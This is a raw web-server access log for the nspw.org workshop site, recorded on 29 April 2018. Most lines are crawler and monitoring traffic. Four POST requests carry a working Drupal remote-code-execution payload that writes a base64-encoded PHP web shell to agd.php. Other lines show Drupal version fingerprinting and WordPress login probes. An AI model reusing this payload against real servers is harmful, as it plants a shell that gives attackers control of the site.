www.nspw.org:80 207.148.125.97 - - [29/Apr/2018:16:36:00 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20agd.php HTTP/1.1" 302 976 "-" "curl/7.47.0"
www.nspw.org:80 64.62.252.164 - - [29/Apr/2018:16:36:10 -0400] "GET /2012 HTTP/1.1" 302 537 "-" "The Knowledge AI"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:16:36:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:16:36:51 -0400] "GET /papers/2011/nspw2011-bicakci.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 43.241.58.23 - - [29/Apr/2018:16:38:45 -0400] "GET /2018/dates HTTP/1.0" 302 512 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:16:40:18 -0400] "GET /papers/2005/nspw2005-taylor-panel.pdf HTTP/1.1" 302 603 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:16:41:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 180.76.15.17 - - [29/Apr/2018:16:42:16 -0400] "GET /papers/2007/nspw2007-solworth.pdf HTTP/1.1" 302 558 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 54.36.148.154 - - [29/Apr/2018:16:42:50 -0400] "GET /2003/hold/ HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 40.77.167.28 - - [29/Apr/2018:16:42:59 -0400] "GET /papers/1996/nspw1996-blakley.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 207.148.125.97 - - [29/Apr/2018:16:43:16 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20agd.php HTTP/1.1" 302 976 "-" "curl/7.47.0"
www.nspw.org:80 210.195.230.174 - - [29/Apr/2018:16:44:44 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 210.195.230.174 - - [29/Apr/2018:16:44:45 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:16:45:04 -0400] "GET /current/program.shtml HTTP/1.1" 302 571 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:16:45:28 -0400] "GET /papers/2004/nspw2004-allwein.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:16:46:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 140.180.247.20 - - [29/Apr/2018:16:46:22 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
www.nspw.org:80 ::1 - - [29/Apr/2018:16:46:30 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [29/Apr/2018:16:46:31 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [29/Apr/2018:16:46:32 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:16:47:11 -0400] "GET /papers/1996/nspw1996-josang.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 199.59.150.180 - - [29/Apr/2018:16:49:08 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.181 - - [29/Apr/2018:16:49:08 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.59.150.180 - - [29/Apr/2018:16:49:09 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.181 - - [29/Apr/2018:16:49:09 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 40.77.167.28 - - [29/Apr/2018:16:49:58 -0400] "GET /papers/2011/nspw2011-locasto.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:16:50:38 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:16:51:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 61.181.142.65 - - [29/Apr/2018:16:52:54 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
www.nspw.org:80 61.181.142.65 - - [29/Apr/2018:16:52:55 -0400] "POST /trackback/ HTTP/1.1" 302 512 "http://www.nspw.org" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
www.nspw.org:80 61.181.142.65 - - [29/Apr/2018:16:52:59 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
www.nspw.org:80 61.181.142.65 - - [29/Apr/2018:16:53:00 -0400] "POST /trackback/ HTTP/1.1" 302 512 "http://www.nspw.org" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
www.nspw.org:80 158.69.229.134 - - [29/Apr/2018:16:54:57 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.34 Safari/537.36"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:16:56:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 54.36.149.57 - - [29/Apr/2018:16:56:42 -0400] "GET /papers/2012/forms/contents.htm HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:16:57:31 -0400] "GET /papers/2010/nspw2010-raskin.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 2.49.203.147 - - [29/Apr/2018:16:59:03 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 2.49.203.147 - - [29/Apr/2018:16:59:07 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:16:59:15 -0400] "GET /papers/2003/nspw2003-alkassar.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 185.244.25.162 - - [29/Apr/2018:17:01:02 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20agd.php HTTP/1.1" 302 976 "-" "curl/7.47.0"
www.nspw.org:80 185.244.25.162 - - [29/Apr/2018:17:01:02 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20agd.php HTTP/1.1" 302 976 "-" "curl/7.47.0"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:01:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 207.241.232.43 - - [29/Apr/2018:17:01:19 -0400] "GET /modules/system/system.theme.css?nhfa6e HTTP/1.0" 302 564 "http://nspw.org/" "Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:17:02:41 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:17:04:36 -0400] "GET /2009/proceedings/1993/?C=D;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:17:04:41 -0400] "GET /2009/proceedings/1994/?C=D;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:17:04:51 -0400] "GET /papers/2003/?C=S;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:17:05:01 -0400] "GET /2009/proceedings/2005/?C=N;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 41.228.52.209 - - [29/Apr/2018:17:05:15 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.228.52.209 - - [29/Apr/2018:17:05:18 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 178.255.215.92 - - [29/Apr/2018:17:05:33 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
www.nspw.org:80 178.255.215.92 - - [29/Apr/2018:17:05:34 -0400] "GET /papers/2006/nspw2006-greenwald.pdf HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
www.nspw.org:80 83.223.234.21 - - [29/Apr/2018:17:05:38 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 83.223.234.21 - - [29/Apr/2018:17:05:39 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:17:06:08 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:06:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 31.146.58.160 - - [29/Apr/2018:17:06:34 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 31.146.58.160 - - [29/Apr/2018:17:06:35 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:17:07:09 -0400] "GET /2013/organizers HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:17:07:51 -0400] "GET /papers/1997/nspw1997-riechmann.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:11:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 117.194.15.119 - - [29/Apr/2018:17:11:20 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 117.194.15.119 - - [29/Apr/2018:17:11:29 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:51 -0400] "GET / HTTP/1.1" 302 475 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:51 -0400] "GET / HTTP/1.1" 302 475 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:51 -0400] "GET /CHANGELOG.txt HTTP/1.1" 302 501 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:51 -0400] "GET /CHANGELOG.txt HTTP/1.1" 302 501 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:52 -0400] "GET /core/CHANGELOG.txt HTTP/1.1" 302 511 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:52 -0400] "GET /includes/bootstrap.inc HTTP/1.1" 302 519 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:52 -0400] "GET /core/includes/bootstrap.inc HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:52 -0400] "GET / HTTP/1.1" 302 475 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:52 -0400] "GET /core/CHANGELOG.txt HTTP/1.1" 302 511 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:53 -0400] "GET /includes/bootstrap.inc HTTP/1.1" 302 519 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:53 -0400] "GET /core/includes/bootstrap.inc HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 185.165.169.146 - - [29/Apr/2018:17:11:53 -0400] "GET / HTTP/1.1" 302 475 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6"
www.nspw.org:80 54.36.149.68 - - [29/Apr/2018:17:13:47 -0400] "GET /2016 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 84.245.15.191 - - [29/Apr/2018:17:15:33 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
www.nspw.org:80 180.76.15.26 - - [29/Apr/2018:17:15:36 -0400] "GET / HTTP/1.1" 302 488 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 201.231.1.30 - - [29/Apr/2018:17:15:39 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 201.231.1.30 - - [29/Apr/2018:17:15:41 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:16:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:17:18:08 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 123.207.95.146 - - [29/Apr/2018:17:19:03 -0400] "GET / HTTP/1.1" 302 492 "-" "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:21:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 185.232.20.242 - - [29/Apr/2018:17:21:58 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [29/Apr/2018:17:21:58 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [29/Apr/2018:17:21:59 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 58.250.125.77 - - [29/Apr/2018:17:23:06 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 40.77.167.26 - - [29/Apr/2018:17:23:19 -0400] "GET /papers/1994/nspw1994-bertino.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 31.200.11.165 - - [29/Apr/2018:17:23:27 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 31.200.11.165 - - [29/Apr/2018:17:23:30 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 58.250.125.77 - - [29/Apr/2018:17:23:35 -0400] "GET / HTTP/1.1" 302 492 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 40.77.167.26 - - [29/Apr/2018:17:25:33 -0400] "GET /2009/proceedings/2005/nspw2005-beznosov.pdf HTTP/1.1" 302 615 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 199.16.157.182 - - [29/Apr/2018:17:25:41 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.182 - - [29/Apr/2018:17:25:42 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:26:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 40.77.167.28 - - [29/Apr/2018:17:26:50 -0400] "GET /2009/proceedings/1996/nspw1996-josang.pdf HTTP/1.1" 302 611 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 37.188.128.253 - - [29/Apr/2018:17:28:42 -0400] "GET / HTTP/1.1" 302 529 "-" "Java/1.8.0_65"
www.nspw.org:80 93.160.60.22 - - [29/Apr/2018:17:28:43 -0400] "GET /papers/2011/nspw2011%E2%80%90feigenbaum.pdf HTTP/1.1" 302 615 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com"
www.nspw.org:80 24.171.250.115 - - [29/Apr/2018:17:28:50 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 24.171.250.115 - - [29/Apr/2018:17:28:51 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:17:30:15 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 51.254.208.48 - - [29/Apr/2018:17:30:54 -0400] "GET / HTTP/1.1" 302 473 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:31:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:17:33:42 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:17:35:25 -0400] "GET /papers/2010/nspw2010-moore.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:36:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 80.82.77.189 - - [29/Apr/2018:17:38:43 -0400] "GET / HTTP/1.1" 302 531 "-" "-"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:17:38:52 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:41:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:17:42:18 -0400] "GET /papers/1999/nspw1999-schneider.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 157.55.39.192 - - [29/Apr/2018:17:44:17 -0400] "GET /papers/1999/nspw1999-schneider.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:46:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 180.76.15.148 - - [29/Apr/2018:17:46:24 -0400] "GET /2010/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 174.50.202.89 - - [29/Apr/2018:17:46:57 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 174.50.202.89 - - [29/Apr/2018:17:46:57 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.9 - - [29/Apr/2018:17:47:24 -0400] "GET /papers/2007/nspw2007-chow.pdf HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 220.181.125.142 - - [29/Apr/2018:17:48:02 -0400] "GET /papers/2011/nspw2011-pavlovic.pdf HTTP/1.1" 302 558 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 220.181.125.142 - - [29/Apr/2018:17:48:14 -0400] "GET /papers/2002/nspw2002-taylor.pdf HTTP/1.1" 302 554 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 180.76.15.29 - - [29/Apr/2018:17:48:24 -0400] "GET /2012/organizers HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
